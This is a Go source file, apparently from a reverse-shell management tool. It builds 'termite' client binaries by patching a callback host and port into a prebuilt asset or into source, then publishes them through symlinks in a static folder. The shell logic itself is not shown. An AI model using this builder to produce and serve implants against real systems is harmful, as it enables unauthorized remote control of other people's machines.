package compiler

import (
	"bytes"
	"errors"
	"fmt"
	"io/ioutil"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"github.com/WangYihang/Platypus/internal/util/assets"
	"github.com/WangYihang/Platypus/internal/util/config"
	"github.com/WangYihang/Platypus/internal/util/fs"
	"github.com/WangYihang/Platypus/internal/util/log"
	"github.com/WangYihang/Platypus/internal/util/str"
	"github.com/WangYihang/Platypus/internal/util/update"
	"github.com/google/uuid"
)

func Compile(target string) bool {
	log.Success("Start building: %s", target)
	output, err := exec.Command("go", "build", "-o", target, "termite.go").Output()
	if err != nil {
		log.Error("Build failed: %s", err)
		return false
	}
	log.Success("Build (%s) success: %s", target, output)
	return true
}

func Compress(target string) bool {
	upx, err := exec.LookPath("upx")
	if err != nil {
		log.Error("No upx executable found")
		return false
	}
	log.Success("Upx detected: %s", upx)
	log.Info("Compressing %s via upx", target)
	output, err := exec.Command("upx", target).Output()
	if err != nil {
		log.Error("Compressing %s failed: %s, %s", target, err, output)
		return false
	}
	log.Success("%s Compressed: %s", target, output)
	return true
}

func BuildTermiteFromSourceCode(targetFilename string, targetAddress string) error {
	content, err := ioutil.ReadFile("termite.go")
	if err != nil {
		log.Error("Can not read termite.go: %s", err)
		return errors.New("can not read termite.go")
	}
	contentString := string(content)
	contentString = strings.Replace(contentString, config.RemoteAddrPlaceHolder, targetAddress, -1)
	err = ioutil.WriteFile("termite.go", []byte(contentString), 0644)
	if err != nil {
		log.Error("Can not write termite.go: %s", err)
		return errors.New("can not write termite.go")
	}

	// Compile termite binary
	if !Compile(targetFilename) {
		log.Error("Can not compile termite.go: %s", err)
		return errors.New("can not compile termite.go")
	}
	return nil
}

func BuildTermiteFromPrebuildAssets(targetFilename string, targetAddress string) error {
	// Step 1: Generating Termite from Assets
	os_string := "linux"
	arch := "amd64"
	assetFilepath := fmt.Sprintf("build/termite/termite_%s_%s", os_string, arch)
	content, err := assets.Asset(assetFilepath)
	if err != nil {
		log.Error("Failed to read asset file: %s", assetFilepath)
		return err
	}

	// Step 2: Generating the placeholder
	replacement := make([]byte, len(config.RemoteAddrPlaceHolder))

	for i := 0; i < len(config.RemoteAddrPlaceHolder); i++ {
		replacement[i] = 0x20
	}

	for i := 0; i < len(targetAddress); i++ {
		replacement[i] = targetAddress[i]
	}

	// Step 3: Replacing the RemoteAddrPlaceHolder
	log.Success("Setting target address to %s", targetAddress)
	content = bytes.Replace(content, []byte(config.RemoteAddrPlaceHolder), replacement, 1)

	// Step 4: Create binary file
	err = ioutil.WriteFile(targetFilename, content, 0755)
	if err != nil {
		log.Error("Failed to write file: %s", targetFilename)
		return err
	}
	return nil
}

func GenerateDirFilename() (string, string, error) {
	dir, err := ioutil.TempDir("", str.RandomString(0x08))
	if err != nil {
		return "", "", err
	}
	var filename string
	if runtime.GOOS == "windows" {
		filename = fmt.Sprintf("%d-%s-termite.exe", time.Now().UnixNano(), str.RandomString(0x10))
	} else {
		filename = fmt.Sprintf("%d-%s-termite", time.Now().UnixNano(), str.RandomString(0x10))
	}
	filepath := filepath.Join(dir, filename)
	return dir, filepath, nil
}

func DoCompile(os_string string, arch string, host string, port uint16) (string, error) {
	// Generate termite binary path & create folder
	termiteFilepath := fmt.Sprintf("compile/%s/%s/%d/%s_%s", update.Version, host, port, os_string, arch)
	termiteFileFolderpath := filepath.Dir(termiteFilepath)
	if !fs.FileExists(termiteFileFolderpath) {
		os.MkdirAll(termiteFileFolderpath, os.ModePerm)
	}

	// Compile and compress
	if !fs.FileExists(termiteFilepath) {
		err := BuildTermiteFromPrebuildAssets(termiteFilepath, fmt.Sprintf("%s:%d", host, port))
		if err != nil {
			return "", err
		}
		/*
			Compress is disabled because the gspt package cannot work under upx compression
			See: https://github.com/erikdubbelboer/gspt/issues/15
		*/
		// Compress(termiteFilepath)
	}

	// Generate termite softlink path & create folder
	// Assume all files in `static` folder are links
	staticFolder := "static"
	for _, linkname := range fs.ListFiles(staticFolder) {
		linkpath := fmt.Sprintf("%s/%s", staticFolder, linkname)
		filename, err := filepath.EvalSymlinks(linkpath)
		if err != nil {
			continue
		}
		absFilepath, err := filepath.Abs(filename)
		if err != nil {
			continue
		}
		absTermiteFilepath, err := filepath.Abs(termiteFilepath)
		if err != nil {
			continue
		}
		if absFilepath == absTermiteFilepath {
			return linkname, nil
		}
	}

	termiteLinkpath := fmt.Sprintf("%s/%s", staticFolder, uuid.New().String())
	termiteLinkFolderpath := filepath.Dir(termiteLinkpath)
	if !fs.FileExists(termiteLinkFolderpath) {
		os.MkdirAll(termiteLinkFolderpath, os.ModePerm)
	}

	// Check if cache exists
	if fs.FileExists(termiteFilepath) {
		log.Info("%s already have been compiled", termiteFilepath)
		log.Info("Creating link (%s) to the compiled file", termiteLinkpath)
		termiteAbsFilepath, err := filepath.Abs(termiteFilepath)
		if err != nil {
			return "", err
		}
		termiteAbsLinkpath, err := filepath.Abs(termiteLinkpath)
		if err != nil {
			return "", err
		}
		err = os.Symlink(termiteAbsFilepath, termiteAbsLinkpath)
		if err != nil {
			return "", err
		}
		return filepath.Base(termiteLinkpath), nil
	} else {
		return "", fmt.Errorf("compilation failed")
	}
}
